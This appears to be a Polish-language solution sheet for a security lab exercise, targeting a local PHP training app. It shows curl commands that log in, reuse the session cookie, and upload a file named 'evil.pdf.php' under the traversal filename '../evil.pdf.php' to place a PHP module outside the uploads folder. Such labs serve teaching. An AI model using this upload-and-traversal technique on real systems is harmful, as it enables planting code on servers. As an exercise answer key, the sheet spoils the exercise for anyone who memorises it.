# Wykonanie [ROZWIĄZANIE]

Używając terminala wykonaj następujące polecenie:

```sh
curl -X POST -d "login=baim&password=baim" -i http://localhost:8080/
```

Z wylistowanego nagłówka skopiuj ciasteczko sesyjne PHPSSID i przeklej je do poniższego polecenia:

```sh
curl -b "PHPSESSID=<ciastko_sesji>" -X POST -F "file=@evil.pdf.php;filename=../evil.pdf.php" -F "submit=Prześlij" -i http://localhost:8080/?module=upload
```

Polecenie to wysyła wskazany plik z podmienioną nazwą.

Sprawdź w katalogu aplikacji, czy udało Ci się wysłać moduł poza folder **uploads**.
